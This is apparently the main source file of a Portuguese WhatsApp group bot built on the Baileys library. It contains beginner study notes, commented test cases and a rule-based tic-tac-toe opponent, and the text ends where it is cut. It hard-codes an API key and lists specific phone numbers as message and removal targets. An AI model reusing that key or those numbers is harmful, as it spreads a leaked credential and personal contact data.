/*
* IGNORE ESSE TEXTO, POIS SÃO ANOTAÇÕES. 
* IGNORE OS " SÓ QUERO DESTACAR AS PALAVRAS. 
* "=" ISSO É CHAMADO DE "RECEBE" NO MUNDO DE JAVASCRIPT. 
* 1° OQ SIGNIFICA VARIÁVEIS? 
* SIGNIFICA "VAR" VAR É IGUAL UMA CONST. 

* ERROS EM QUE CONSTA EM ALTERAR ALGO.
* SYNTAXERROR: MISSING ) AFTER ARGUMENT LIST 
* ERRO DE SINTAXE: FALTA ) DEPOIS DA LISTA DE ARGUMENTO 
* VC COLOCOU ALGO COMO SÓ ISSO }
* ENTÃO VAI DA ERRO, PQ FALTA UM ) 
* QUE IRIA FICAR ASSIM })

* OUTRO ERRO: 
} catch (e) {
  ^^^^^
* SYNTAXERROR: UNEXPECTED TOKEN 'CATCH'
* PROVAVELMENTE VC ESQUECEU DE UM }

//_NOTA 1 :
//_ * if (!isGroup) return reply('somente em grupos')
//_ * if com "!" antes do "is" é só para grupos
//======================================\\

//_* NOTA 2
//_* if (isGroup) return reply('somente no pv')
//_* if sem "!" antes do "is" é só para pv/privado
//======================================\\

//======================================\\
/****************NOTAS DE ESTUDO****************\\
Palavras-chave JavaScript
As instruções JavaScript geralmente começam com uma palavra - chave para identificar a ação JavaScript a ser executada.
Nossa referência de palavras reservadas lista todas as palavras-chave JavaScript.
Aqui está uma lista de algumas das palavras-chave que você aprenderá neste tutorial:
Palavra-chave = Descrição
var = Declara uma variável
let = Declara uma variável de bloco
const = Declara uma constante de bloco
if = Marca um bloco de instruções a serem executadas em uma condição
switch = Marca um bloco de instruções a serem executadas em casos diferentes
for = Marca um bloco de instruções a ser executado em um loop
function = Declara uma função
return = Sai de uma função
try = Implementa o tratamento de erros em um bloco de declarações

 * O operador de multiplicação ( *) multiplica números. *
 * O operador de adição ( +) adiciona números *
* O operador de atribuição ( =) atribui um valor a uma variável. *


//_*CASES PARA COLOCA DPS:
case 'promoteall':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
loli.groupMakeAdmin(from, members_id)
break

//======================================\\

//_*CASES DE TESTES:
case 'rg':
if (isUser) return  reply(`📌 *Você já está registrado*`)
if (!q.includes('|')) return reply(ptbr.rgerrado(prefix, pushname))
// const namaUser = q.substring(0, q.indexOf('/') - 0)
// const idad = getRegisterAge(sender)
// const serialUser = createSerial(20)
  try {
 var ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
   var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buff = await getBuffer(ppimg)
const registro = 
`
┬────────────┈ ⳹
┌┤➤ REGISTRADO
││
││Registro bem-sucedido com
││ID: ${serialUser}
││horário ${time}
││Nome: ${pushname}
││Idade: ${idad}
││Número: wa.me/${sender.split('@')[0]}
││Obrigada por se registrar
││Para usar o bot digite ${prefix}menu
││Total de usuários registrados: ${_registered.length}
│├────────
││ _SISTEMA DE REGISTRO_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙
`            
veri = sender
if (isGroup) {
addRegisteredUser(sender, pushname, time, serialUser)
await loli.sendMessage(from, buff, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, caption: `${registro}`})
addATM(sender)
addLevelingId(sender)                 
} else {
addRegisteredUser(sender, pushname, time, serialUser)
await loli.sendMessage(from, buff, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, caption: `${registro}`})
addATM(sender)
addLevelingId(sender)                  
}
break

=

if (selectedButton == `Abrir`) {
reply('Grupo aberto com sucesso')
loli.groupSettingChange(from, GroupSettingChange.messageSend, false)
}

if (selectedButton == `Fechar`) {
await loli.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply('Grupo fechado com sucesso')
}

case 'buttonk':
const buttons = [
  {buttonId: 'id1', buttonText: {displayText: `.menu`}, type: 1},
  {buttonId: 'id2', buttonText: {displayText: `${prefix}Menu`}, type: 1},
  {buttonId: 'id3', buttonText: {displayText: 'sla'}, type: 1}
  ]
const buttonMessage = {
    contentText: "teste",
    footerText: 'teste',
    buttons: buttons,
    headerType: 1
}
loli.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
break

case 'buttonk':
const buttons = [
  {buttonId: 'id1', buttonText: {displayText: `.menu`}, type: 1},
  ]
const buttonMessage = {
    contentText: "teste",
    footerText: 'teste',
    buttons: buttons,
    headerType: 1
}
loli.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
break

//======================================\\

//_*SÓ TESTES:
> ( async() =>{
reply("a")
await sleep(2000)
reply("b")
await sleep(4000)
reply("c")
await sleep(6000)
reply("d")
await sleep(8000)
reply("f")
await sleep(10000)
})()

=

> ( async() =>{
reply("a")
await sleep(2000)
reply("b")
await sleep(4000)
reply("c")
})()

=

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(hr < "16:4q:00" && aaa == 'on'){
aaa == 'off'
loli.sendMessage(`559481417512@s.whatsapp.net`, "jajajajaja", text)
} else if ( hr >= "16:41:00" && aaa == 'off'){
aaa == 'on'
}

=

if(time2 < "20:20:00" && aaa == 'on'){
aaa == 'off'
loli.sendMessage(`559481417512@s.whatsapp.net`, "jajajajaja", text)
} else if (time2 >= "20:20:05" && aaa == 'off'){
aaa == 'on'
}

=

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
const hr = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
if (hr >= "11:55:00") {
loli.sendMessage(`559481417512@s.whatsapp.net`, "teste", text)
}

=

const hour_now = moment().format('HH:mm:ss')
if (hour_now >= '14:30:00' && hour_now <= '14:30:00') {
loli.sendMessage(`559481417512@s.whatsapp.net`, "teste", text)
}

=

anu = ["5511959118827@s.whatsapp.net"]
reply(`1 minuto`)
setTimeout( () => {
loli.groupRemove(from, (anu))
}, 10000)

=

if(time2 < "12:05:00"){
bufe1 = fs.readFileSync('./database/audios/menuzin.mp3')
loli.sendMessage(from, bufe1, audio, {mimetype: 'audio/mp4', ptt:true})
console.log('Auto figu')
}

=

if (time2 >= '11:47:00' && time2 <= '11:50:00') {
reply(`kskksksksks`)
}

=

//RESPONDER AUTOMATICAMENTE //EM MARCAR FIGURINHAS, PUXE O LINK DA FIGURINHA COM O *HASH\\
switch (cmdstk) {
case '/Jc9kiS63G+4urTqzHEJvUoftm/7+jyhs2NRVFu2Gcg=':
reply('🐶')
}

*/
//_API WHATSAPP WEB
const {
  WAConnection,
  MessageType,
  Presence,
  Mimetype,
  GroupSettingChange,
  MessageOptions,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  waChatKey,
  mentionedJid,
  processTime,
  ChatModification,
} = require('@adiwajshing/baileys');

//_MÓDULOS NPM


const simple = require('./lib/simple.js')
//const WAConnection = simple.WAConnection(_WAConnection)
const { setGame, validmove } = require("tictactoe"); //Jogo da velha 
const fs = require('fs');
const moment = require('moment-timezone');
const { exec, spawn } = require('child_process');
const kagApi = require('@kagchi/kag-api');
const fetc = require('node-fetch');
const ffmpeg = require('fluent-ffmpeg');
const { removeBackgroundFromImageFile } = require('remove.bg');
const imgbb = require('imgbb-uploader');
const lolis = require('lolis.life');
const loli = new lolis();
const speed = require('performance-now');
const cd = 4.32e+7 ;
const qrcode = require("qrcode-terminal");
const crypto = require('crypto');
const axios = require('axios').default;
const imageToBase64 = require('image-to-base64');
const cheerio = require('cheerio')
const util = require('util');
const os = require('os');
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
}

const express = require('express');

const app = express();

const port = 3000;

app.get('/', (req, res) => res.send('hori esta online no momento'));

app.listen(port, () => console.log(`http://localhost:${port}`));

//_ARQUIVOS DA LIB
const {color, bgcolor} = require('./lib/color');
const {fetchJson} = require('./lib/fetcher');
const {recognize} = require('./lib/ocr');
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close, addATM, addKoinUser, checkATMuser, temporizador } = require('./lib/functions');
const help234 = require('./lib/help')
const { postBuffer, postBufferFile, postJson, getJson, getRandomExt, countdownTime, randomChoice } = help234
const { webp2gifFile } = require("./lib/gif.js")
const { cmdadd } = require('./lib/totalcmd.js')
const request = require('request')
const FormData = require('form-data')
const { convertSticker } = require('./swm.js')
const fetch = require('node-fetch')
const Jimp = require('jimp')
const { getRegisterNo, getRegisterName, getRegisterSerial, getRegisterAge, getRegisterTime, getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./lib/register.js')
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab } = require('./lib/leveling.js')
const { checkPetualangUser, addInventori, addBesi, sellBesi, getBesi, addDm, sellDm, getDm, addEmas, sellEmas, getEmas, addFish, sellFish, getFish } = require("./lib/rpgfunction");
const { isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance} = require('./limit');
const { addTTTId, addTTTwin, addTTTdefeat, addTTTtie, addTTTpoints, getTTTId, getTTTwins, getTTTdefeats, getTTTties, getTTTpoints } = require('./lib/tictactoe.js')//JOGO DA VELHA,AGRADECIMENTOS: IRIS(kill), Resen
const { addLimit, getLimit } = require('./lib/limit.js')// LIMITADOR, AGRADECIMENTOS: IRIS(kill), Resen
const { y2mateA, y2mateV } = require('./lib/y2mate.js')
const {stickerImgTag, stickerVidTag, addExif, stickerForVideo } = require('./lib/sticker')
const { addMetadata } = require('./lib/exif.js')
const hx = require('./lib/sayo-api')
const { formatp, runtime } = require('./lib/mizu.js');
var Exif = require('./mess/exif')
var exif = new Exif()
const yts = require('yt-search')
const { uploadimg } = require('./lib/uploadimg')
const { yag } = require('./database/asu') //YAG //IGUAL PTBR

// Bot Status
        const used = process.memoryUsage()
        const cpus = os.cpus().map(cpu => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			return cpu
        })
        const cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total
			last.speed += cpu.speed / length
			last.times.user += cpu.times.user
			last.times.nice += cpu.times.nice
			last.times.sys += cpu.times.sys
			last.times.idle += cpu.times.idle
			last.times.irq += cpu.times.irq
			return last
        }, {
            speed: 0,
			total: 0,
			times: {
			    user: 0,
			    nice: 0,
			    sys: 0,
			    idle: 0,
			    irq: 0
            }
        })

//_JSON INFORMAÇÕES DO USUÁRIO
const _level = JSON.parse(fs.readFileSync('./datauser/level.json'));
const _registered = JSON.parse(fs.readFileSync('./datauser/registered.json'));
const uang = JSON.parse(fs.readFileSync('./datauser/uang.json'));
const ban = JSON.parse(fs.readFileSync('./datauser/banned.json'));
const prem = JSON.parse(fs.readFileSync('./datauser/premium.json'));
const vipp = JSON.parse(fs.readFileSync('./database/vip.json'));
//_ OUTROS ARQUIVOS DO BOT
const tictactoe = JSON.parse(fs.readFileSync('./database/ttt/tictactoe.json'));
const dinheiro = JSON.parse(fs.readFileSync('./datauser/uang.json')) 
const daily = JSON.parse(fs.readFileSync('./data/diario.json'))
const sotoy = JSON.parse(fs.readFileSync('./data/sotoy.json'))
const autoreply = JSON.parse(fs.readFileSync('./database/json/autoreply.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/json/nsfw.json'));
const img2 = fs.readFileSync("./lib/logo.jpeg");
const config = require('./lib/config.json')
const { ptbr } = require('./database/mess')
const totalcmd = JSON.parse(fs.readFileSync('./data/totalcmd.json'))[0].totalcmd
const { Exkey } = JSON.parse(fs.readFileSync('./data/apikey.json')) 
const { isFiltered, addFilter } = require('./lib/antispam')
const { isFilteredd, addFilterr } = require('./lib/antispam1')

 var ikan = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐡','🐙']
        var hewan = ['🐔','🦃','🦆','🐐','🐏','🐖','🐑','🐎','🐺']
        var burung = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']

//_INFORMAÇÕES DO BOT(settings)
const infos = JSON.parse(fs.readFileSync('./data/settings.json'))
const {SeuNome, SeuNumero, SegundoNumero, limitCount, NomDoBot, NumeroDoSeuBot, NomeDoBot, NomeDoAtualDono, cdd, ammOff, cr, crtt, crh } = infos
const blocked = []
const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
//_TESTE MENU <==>
const { help } = require('./database/help/help')
const { regras } = require('./database/help/regras')
const { m18 } = require('./database/help/m18')

//BANCO DE DADOS HENPLAY
const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./src/video.json'))
const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))
const balance = JSON.parse(fs.readFileSync('./balance.json'))

//sistema de imgbb e apikey
const apikeyG = '941644256336912a1409c0bcfce50071';
const dfrply = fs.readFileSync('./lib/logo.jpeg');
// ARQUIVOS NOVOS, DESLIGA && LIGAR
const _leveling = JSON.parse(fs.readFileSync('arquivos/leveling.json'));
const antilink = JSON.parse(fs.readFileSync('arquivos/antilink.json'));
const antinsfw = JSON.parse(fs.readFileSync('arquivos/antinsfw.json'));
const autofigu = JSON.parse(fs.readFileSync('arquivos/autofigu.json'));
const antifake = JSON.parse(fs.readFileSync('./arquivos/antifake.json'));
const welcome = JSON.parse(fs.readFileSync('arquivos/welcome.json'));
const antictt = JSON.parse(fs.readFileSync('arquivos/antictt.json'));
const antiflod = JSON.parse(fs.readFileSync('arquivos/antiflod.json'));
const anticatalogo = JSON.parse(fs.readFileSync('./database/json/anticatalogo.json'));
const antiloc = JSON.parse(fs.readFileSync('./src/antiloc.json'));
const dontback = JSON.parse(fs.readFileSync('./src/dontback.json'));
const antidoc = JSON.parse(fs.readFileSync('./src/antidoc.json'));
const antipv = JSON.parse(fs.readFileSync('./src/antipv.json'));
const countMessage = JSON.parse(fs.readFileSync('./src/countmsg.json'));
const antitexto = JSON.parse(fs.readFileSync('arquivos/antitexto.json'));
const antiteste = JSON.parse(fs.readFileSync('arquivos/antiteste.json'));
const votacao = JSON.parse(fs.readFileSync('./arquivos_json/votacao.json'))
const votou = JSON.parse(fs.readFileSync('./arquivos_json/votou.json'))
banChats = false
multi = false. //MULTI PREFIX
charging = 'não detectado'
baterai = 'não detectado'
aaa = 'on'
numbernye = '0'
healtawal = 100

//_VCARD DONO DO BOT
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN:${NomeDoAtualDono}️\n`
            + 'ORG:Dono do Bot;\n' 
            + `TEL;type=CELL;type=VOICE;waid=${SeuNumero}:?${SegundoNumero}\n`
            + 'END:VCARD'

//_TIC-TAC-TOE
const { ttthelp } = require('./database/ttt/TTTconfig/ttthelp');
const { tttme } = require('./database/ttt/TTTconfig/tttme');
var tttset = require('./database/ttt/TTTconfig/tttset.json');
var esp = require('./database/ttt/TTTconfig/tttframe.json');

//_TESTE PARA VITÓRIA DE ❌
const WinnerX = () => {
	if (
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="❌") || (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="❌") || (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="❌") || 
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="❌") || (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="❌") || (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="❌") || (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="❌")
	) {
		return true
	} else {
		return false
	}
}

//TESTE PARA VITÓRIA DE ⭕
const WinnerO = () => {
	if (
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="⭕") || (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="⭕") || (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="⭕") || 
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="⭕") || (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="⭕") || (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="⭕") || (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="⭕")
	) {
		return true
	} else {
		return false
	}
}

//TESTE PARA EMPATE
const Tie = () => {
	if (esp.a1!="🔲"&&esp.a2!="🔲"&&esp.a3!="🔲"&&esp.b1!="🔲"&&esp.b2!="🔲"&&esp.b3!="🔲"&&esp.c1!="🔲"&&esp.c2!="🔲"&&esp.c3!="🔲") {
		return true
	} else {
		return false
	}
}

const IA = () => {
    if (WinnerX() || WinnerO() || Tie()) {
		tttset.reActivate1 = "off"
//INICIO DO MODO IMPOSSIVEL
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		tttset.reActivate1 = "off"
		IAmove1()
	//JOGADAS PROGRAMADAS ABAIXO
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
     	  tttset.reActivate1 = "off"
          esp.a1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.a2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.a3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.b1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
